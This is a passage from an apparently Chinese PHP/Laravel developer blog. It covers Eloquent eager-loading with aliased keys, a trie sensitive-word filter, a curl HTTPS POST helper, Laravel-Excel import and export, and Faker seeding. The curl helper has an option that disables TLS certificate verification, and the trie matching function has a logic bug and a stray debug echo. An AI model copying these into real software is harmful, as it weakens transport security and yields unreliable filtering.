Admin_menu::<span class="keyword">with</span>([<span class="string">'children'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">                $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">            &#125;])</span><br><span class="line">            -&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">where <span class="keyword">in</span> （array）这里的 array 是依赖主键的名称的，在关联查询的时候，已经定义了 id = [<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6.</span>..]，但是我们最后给 id 取了别名，变成 MaindId，所以找不到名为 id 的数组。</span><br><span class="line">如果真是这样，我们试着再给它加上 id，让它能够找到名为 id 的数组</span><br><span class="line">    \DB::connection()-&gt;enableQueryLog(); <span class="comment">// 开启查询日志</span></span><br><span class="line">    $menus =  Admin_menu::<span class="keyword">with</span>([<span class="string">'children'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">        $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">    &#125;])</span><br><span class="line">    -&gt;select(<span class="string">'id'</span>, <span class="string">'id as MainId'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">    -&gt;get();</span><br><span class="line">    foreach (\DB::getQueryLog() <span class="keyword">as</span> $sql) &#123;</span><br><span class="line">        dump($sql[<span class="string">'query'</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    依赖关联主键 localKey 的查询，不能缺少相应的字段，也就是说 select 应该包含对应 localKey，如果要取别名应该额外添加，形如：</span><br><span class="line">    </span><br><span class="line">    select(<span class="string">'id'</span>, <span class="string">'id as MainId'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>, <span class="string">'parent_id as extraId'</span>)</span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        $menus = Admin_menu::<span class="keyword">with</span>([<span class="string">'parent'</span> =&gt; <span class="function"><span class="keyword">function</span>(<span class="params">$query</span>)</span>&#123;</span><br><span class="line">                $query-&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>);</span><br><span class="line">            &#125;])</span><br><span class="line">            -&gt;select(<span class="string">'id'</span>, <span class="string">'title'</span>, <span class="string">'parent_id'</span>)</span><br><span class="line">            -&gt;get();</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;transformer($menus);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    protected <span class="function"><span class="keyword">function</span> <span class="title">transformer</span>(<span class="params">$items</span>) </span>&#123;</span><br><span class="line">        $data = [];</span><br><span class="line">        foreach ($items ?? [] <span class="keyword">as</span> $item) &#123;</span><br><span class="line">            $data[] = [</span><br><span class="line">                <span class="string">'mainId'</span> =&gt; $item-&gt;id,</span><br><span class="line">                <span class="string">'title'</span> =&gt; $item-&gt;title,</span><br><span class="line">                <span class="string">'parent_id'</span> =&gt; $item-&gt;parent_id,</span><br><span class="line">                <span class="string">'children'</span> =&gt; $item-&gt;children,</span><br><span class="line">            ];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $data;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="敏感词过滤算法"><a href="#敏感词过滤算法" class="headerlink" title="敏感词过滤算法"></a>敏感词过滤算法</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">https:<span class="comment">//juejin.im/post/5cb56372f265da037d4fa133</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TreeMap</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    public $data;  <span class="comment">// 节点字符</span></span><br><span class="line">    public $children = [];  <span class="comment">// 存放子节点引用（因为有任意个子节点，所以靠数组来存储）</span></span><br><span class="line">    public $isEndingChar = <span class="literal">false</span>;  <span class="comment">// 是否是字符串结束字符</span></span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TrieTree</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 敏感词数组</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @var array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public $trieTreeMap = array();</span><br><span class="line"></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;trieTreeMap = <span class="keyword">new</span> TreeMap(<span class="string">'/'</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 获取敏感词Map</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">getTreeMap</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;trieTreeMap;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 添加敏感词</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param array $txtWords</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">addWords</span>(<span class="params">array $wordsList</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        foreach ($wordsList <span class="keyword">as</span> $words) &#123;</span><br><span class="line">            $trieTreeMap = $<span class="keyword">this</span>-&gt;trieTreeMap;</span><br><span class="line">            $len = mb_strlen($words);</span><br><span class="line">            <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $len; $i++) &#123;</span><br><span class="line">                $word = mb_substr($words, $i, <span class="number">1</span>);</span><br><span class="line">                <span class="keyword">if</span>(!isset($trieTreeMap-&gt;children[$word]))&#123;</span><br><span class="line">                    $newNode = <span class="keyword">new</span> TreeMap($word);</span><br><span class="line">                    $trieTreeMap-&gt;children[$word] = $newNode;</span><br><span class="line">                &#125;</span><br><span class="line">                $trieTreeMap = $trieTreeMap-&gt;children[$word];</span><br><span class="line">            &#125;</span><br><span class="line">            $trieTreeMap-&gt;isEndingChar = <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 查找对应敏感词</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param string $txt</span></span><br><span class="line"><span class="comment">     * @return array</span></span><br><span class="line"><span class="comment">     * @author qpf</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">search</span>(<span class="params">$txt</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $wordsList = array();</span><br><span class="line">        $txtLength = mb_strlen($txt);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $txtLength; $i++) &#123;</span><br><span class="line">            $wordLength = $<span class="keyword">this</span>-&gt;checkWord($txt, $i, $txtLength);</span><br><span class="line">            <span class="keyword">if</span>($wordLength &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                echo $wordLength;</span><br><span class="line">                $words = mb_substr($txt, $i, $wordLength);</span><br><span class="line">                $wordsList[] = $words;</span><br><span class="line">                $i += $wordLength - <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $wordsList;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 敏感词检测</span></span><br><span class="line"><span class="comment">     * </span></span><br><span class="line"><span class="comment">     * @param $txt</span></span><br><span class="line"><span class="comment">     * @param $beginIndex</span></span><br><span class="line"><span class="comment">     * @param $length</span></span><br><span class="line"><span class="comment">     * @return int</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    private <span class="function"><span class="keyword">function</span> <span class="title">checkWord</span>(<span class="params">$txt, $beginIndex, $length</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $flag = <span class="literal">false</span>;</span><br><span class="line">        $wordLength = <span class="number">0</span>;</span><br><span class="line">        $trieTree = $<span class="keyword">this</span>-&gt;trieTreeMap; <span class="comment">//获取敏感词树</span></span><br><span class="line">        <span class="keyword">for</span> ($i = $beginIndex; $i &lt; $length; $i++) &#123;</span><br><span class="line">            $word = mb_substr($txt, $i, <span class="number">1</span>); <span class="comment">//检验单个字</span></span><br><span class="line">            <span class="keyword">if</span> (!isset($trieTree-&gt;children[$word])) &#123; <span class="comment">//如果树中不存在，结束        </span></span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">//如果存在</span></span><br><span class="line">            $wordLength++; </span><br><span class="line">            $trieTree = $trieTree-&gt;children[$word];</span><br><span class="line">            <span class="keyword">if</span> ($trieTree-&gt;isEndingChar === <span class="literal">true</span>) &#123;  </span><br><span class="line">                $flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>($beginIndex &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            $flag || $wordLength = <span class="number">0</span>; <span class="comment">//如果$flag == false  赋值$wordLenth为0</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $wordLength;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$data = [<span class="string">'白粉'</span>, <span class="string">'白粉人'</span>, <span class="string">'白粉人嫩'</span>,<span class="string">'不该大'</span>];</span><br><span class="line">$wordObj = <span class="keyword">new</span> TrieTree();</span><br><span class="line">$wordObj-&gt;addWords($data);</span><br><span class="line"></span><br><span class="line">$txt = <span class="string">"白粉啊,白粉人，我不该大啊"</span>;</span><br><span class="line">$words = $wordObj-&gt;search($txt);</span><br><span class="line">var_dump($words);die;</span><br></pre></td></tr></table></figure>
<h3 id="curl-https"><a href="#curl-https" class="headerlink" title="curl https"></a>curl https</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">curl请求https，需要设置ipv4访问，ipv6的话会导致解析不了域名，php代码如下：</span><br><span class="line"><span class="comment">//请求https需要用ipv4</span></span><br><span class="line">$curl-&gt;setOption(CURLOPT_IPRESOLVE, CURL_IPRESOLVE_V4);</span><br><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * curl POST </span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> * @param   string  url </span></span><br><span class="line"><span class="comment"> * @param   array   数据 </span></span><br><span class="line"><span class="comment"> * @param   int     请求超时时间 </span></span><br><span class="line"><span class="comment"> * @param   bool    HTTPS时是否进行严格认证 </span></span><br><span class="line"><span class="comment"> * @return  string </span></span><br><span class="line"><span class="comment"> */</span>  </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curlPost</span>(<span class="params">$url, $data = array(</span>), <span class="title">$timeout</span> = 30, <span class="title">$CA</span> = <span class="title">true</span>)</span>&#123;    </span><br><span class="line">  </span><br><span class="line">    $cacert = getcwd() . <span class="string">'/cacert.pem'</span>; <span class="comment">//CA根证书https://segmentfault.com/a/1190000005856334  </span></span><br><span class="line">    $SSL = substr($url, <span class="number">0</span>, <span class="number">8</span>) == <span class="string">"https://"</span> ? <span class="literal">true</span> : <span class="literal">false</span>;  </span><br><span class="line">      </span><br><span class="line">    $ch = curl_init();  </span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout<span class="number">-2</span>);  </span><br><span class="line">    <span class="keyword">if</span> ($SSL &amp;&amp; $CA) &#123;  </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">true</span>);   <span class="comment">// 只信任CA颁布的证书  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_CAINFO, $cacert); <span class="comment">// CA根证书（用来验证的网站证书是否是CA颁布）  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">2</span>); <span class="comment">// 检查证书中是否设置域名，并且是否与提供的主机名匹配  </span></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($SSL &amp;&amp; !$CA) &#123;  </span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, <span class="literal">false</span>); <span class="comment">// 信任任何证书  </span></span><br><span class="line">        curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, <span class="number">1</span>); <span class="comment">// 检查证书中是否设置域名  </span></span><br><span class="line">    &#125;  </span><br><span class="line">    curl_setopt($ch, CURLOPT_RETURNTRANSFER, <span class="literal">true</span>);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_HTTPHEADER, array(<span class="string">'Expect:'</span>)); <span class="comment">//避免data数据过长问题  </span></span><br><span class="line">    curl_setopt($ch, CURLOPT_POST, <span class="literal">true</span>);  </span><br><span class="line">    curl_setopt($ch, CURLOPT_POSTFIELDS, $data);  </span><br><span class="line">    <span class="comment">//curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data)); //data with URLEncode  </span></span><br><span class="line">  </span><br><span class="line">    $ret = curl_exec($ch);  </span><br><span class="line">    <span class="comment">//var_dump(curl_error($ch));  //查看报错信息  </span></span><br><span class="line">  </span><br><span class="line">    curl_close($ch);  </span><br><span class="line">    <span class="keyword">return</span> $ret;    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Laravel-Excel3-0"><a href="#Laravel-Excel3-0" class="headerlink" title="Laravel-Excel3.0"></a>Laravel-Excel3.0</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line">composer <span class="built_in">require</span> maatwebsite/excel</span><br><span class="line">app/app 注册服务及门面：</span><br><span class="line"></span><br><span class="line"><span class="string">'providers'</span> =&gt; [   </span><br><span class="line">    Maatwebsite\Excel\ExcelServiceProvider::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]</span><br><span class="line"><span class="string">'aliases'</span> =&gt; [ </span><br><span class="line">    <span class="string">'Excel'</span> =&gt; Maatwebsite\Excel\Facades\Excel::<span class="class"><span class="keyword">class</span>,</span></span><br><span class="line">]</span><br><span class="line">php artisan vendor:publish</span><br><span class="line"></span><br><span class="line">创建 app/exports/<span class="keyword">export</span>.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use Maatwebsite\Excel\Concerns\FromCollection;</span><br><span class="line">use Maatwebsite\Excel\Concerns\WithHeadings; <span class="comment">//设置标题</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\ShouldAutoSize; <span class="comment">//自动单元格尺寸</span></span><br><span class="line">use PhpOffice\PhpSpreadsheet\Style\NumberFormat; <span class="comment">//设置单元格数据格式</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\WithColumnFormatting; <span class="comment">//设置列格式</span></span><br><span class="line">use Maatwebsite\Excel\Concerns\WithStrictNullComparison; <span class="comment">//为空时零填充</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">InvoicesExport</span> <span class="title">implements</span> <span class="title">FromCollection</span>,<span class="title">WithHeadings</span>,<span class="title">WithStrictNullComparison</span>,<span class="title">WithColumnFormatting</span>,<span class="title">ShouldAutoSize</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    protected $data;</span><br><span class="line"></span><br><span class="line">    protected $header;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    * Excel类的构造函数</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params">$data, $header</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;data = $data;</span><br><span class="line">        $<span class="keyword">this</span>-&gt;header = $header;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//导出数据逻辑</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">collection</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;data;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//首行标题</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">headings</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $<span class="keyword">this</span>-&gt;header;</span><br><span class="line">    &#125;</span><br><span class="line">      <span class="comment">//设置列格式</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">columnFormats</span>(<span class="params"></span>): <span class="title">array</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="comment">//'E' =&gt; NumberFormat::FORMAT_DATE_XLSX14,</span></span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">控制器中使用：</span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">export</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    $data = Post::get();</span><br><span class="line">    $header = [ <span class="string">'ID'</span>,</span><br><span class="line">        <span class="string">'姓名'</span>,</span><br><span class="line">        <span class="string">'年龄'</span>,</span><br><span class="line">        <span class="string">'性别'</span>,</span><br><span class="line">        <span class="string">'创建时间'</span>,</span><br><span class="line">        <span class="string">'修改时间'</span>];</span><br><span class="line">    <span class="keyword">return</span> \Excel::download(<span class="keyword">new</span> InvoicesExport($data, $header), <span class="string">"测试导出.xls"</span>);</span><br><span class="line">&#125;</span><br><span class="line">创建 app/Exports/Import.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">namespace App\Exports;</span><br><span class="line"></span><br><span class="line">use Maatwebsite\Excel\Concerns\ToArray;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Import</span> <span class="title">implements</span> <span class="title">ToArray</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="comment">//重新父类实现</span></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">array</span>(<span class="params">array $array</span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> $array;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">控制器使用：https:<span class="comment">//learnku.com/articles/26940</span></span><br><span class="line"></span><br><span class="line">public <span class="function"><span class="keyword">function</span> <span class="title">import</span>(<span class="params">Request $request</span>)</span>&#123;</span><br><span class="line">    $file = $request-&gt;file(<span class="string">'file'</span>);</span><br><span class="line">    $data = \Excel::toArray(<span class="keyword">new</span> Import(), $file);</span><br><span class="line">    dd($data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="数据填充功能生成中文测试数据"><a href="#数据填充功能生成中文测试数据" class="headerlink" title="数据填充功能生成中文测试数据"></a>数据填充功能生成中文测试数据</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">$factory-&gt;define(App\Product::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> (<span class="title">Faker</span>\<span class="title">Generator</span> $<span class="title">faker</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'name'</span> =&gt; $faker-&gt;name,</span><br><span class="line">        <span class="string">'mobile'</span> =&gt; $faker-&gt;phoneNumber,</span><br><span class="line">        <span class="string">'province'</span> =&gt; $faker-&gt;state,</span><br><span class="line">        <span class="string">'city'</span> =&gt; $faker-&gt;city,</span><br><span class="line">        <span class="string">'area'</span> =&gt; $faker-&gt;area,</span><br><span class="line">        <span class="string">'address'</span> =&gt; $faker-&gt;streetAddress,</span><br><span class="line">        <span class="string">'postcode'</span> =&gt; $faker-&gt;postcode,</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br><span class="line">$factory-&gt;define(App\Address::<span class="class"><span class="keyword">class</span>, <span class="title">function</span> () </span>&#123;</span><br><span class="line">    $faker = Faker\Factory::create(<span class="string">'zh_CN'</span>);<span class="comment">//在 config\app.php 文件中加入 faker_locale =&gt; 'zh_CN' 就可以实现了</span></span><br><span class="line"><span class="comment">//https://tianyong90.com/2019/03/10/shi-yong-laravel-shu-ju-tian-chong-gong-neng-sheng-cheng-zhong-wen-ce-shi-shu-ju/</span></span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">        <span class="string">'user_id'</span> =&gt; <span class="number">1</span>,</span><br><span class="line">        <span class="string">'name'</span> =&gt; $faker-&gt;name,</span><br><span class="line">        <span class="string">'mobile'</span> =&gt; $faker-&gt;phoneNumber,</span><br><span class="line">        <span class="string">'province'</span> =&gt; $faker-&gt;state,</span><br><span class="line">        <span class="string">'city'</span> =&gt; $faker-&gt;city,</span><br><span class="line">        <span class="string">'area'</span> =&gt; $faker-&gt;area,</span><br><span class="line">        <span class="string">'address'</span> =&gt; $faker-&gt;streetAddress,</span><br><span class="line">        <span class="string">'postcode'</span> =&gt; $faker-&gt;postcode,</span><br><span class="line">    ];</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
